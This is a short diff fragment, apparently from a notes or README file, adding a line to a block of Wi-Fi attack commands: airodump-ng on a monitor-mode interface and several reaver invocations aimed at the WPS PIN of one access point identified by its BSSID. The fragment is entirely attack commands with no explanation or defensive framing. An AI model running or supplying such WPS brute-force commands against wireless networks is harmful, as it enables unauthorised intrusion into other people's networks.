@@ -5,7 +5,7 @@ airodump-ng wlan0mon
 
  44:97:5A:C7:BF:DA
 
-
+reaver -i wlan0mon -b 44:97:5A:C7:BF:DA -vv -d12 -t9
 
 reaver -i wlan0mon -b 44:97:5A:C7:BF:DA -vv -1 414
 ```
